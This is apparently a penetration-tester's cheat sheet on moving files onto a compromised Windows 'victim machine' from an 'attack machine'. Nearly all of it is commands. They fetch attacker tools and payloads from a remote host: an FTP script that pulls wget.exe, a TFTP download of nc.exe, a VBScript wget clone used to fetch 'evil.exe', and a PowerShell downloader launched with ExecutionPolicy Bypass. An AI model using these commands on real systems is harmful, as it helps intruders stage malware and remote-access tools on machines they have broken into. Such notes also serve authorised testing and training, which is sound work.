# Windows basics

## Transferring files

Why is this so much harder in Windows? I don't know.

## FTP

Even though many Windows versions have FTP clients, we can't use them interactively because it will kill shells. But we can run multiple commands from a file and download them from an FTP server like `pure-ftpd`on the attack machine.

On the victim machine, echo the following commands into a file:

```text
echo open [host] 21> ftp.txt
echo USER username>> ftp.txt
echo password>> ftp.txt
echo bin>> ftp.txt
echo GET wget.exe>> ftp.txt
echo bye>> ftp.txt
```

Then run this command to connect:

```text
ftp -v -n -s:ftp.txt
```

## TFTP

TFTP is installed by default on Windows XP and Windows 2003. Kali also has a TFTP server:

```text
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
```

With this command you can serve files from `/srv/tftp`.

From a Windows machine, use this to transfer files:

```text
tftp -i [host] get nc.exe
```

### VBScript

Here is a good script to make a wget-clone in VB \(may need to be piped through unix2dos before copying it\):

```text
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

To execute:

```text
cscript wget.vbs http://[hoste]/evil.exe evil.exe
```

### Powershell

Powershell can't be started in a non-interactive shell. But this script can start it:

```text
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://[host]/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

To execute:

```text
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

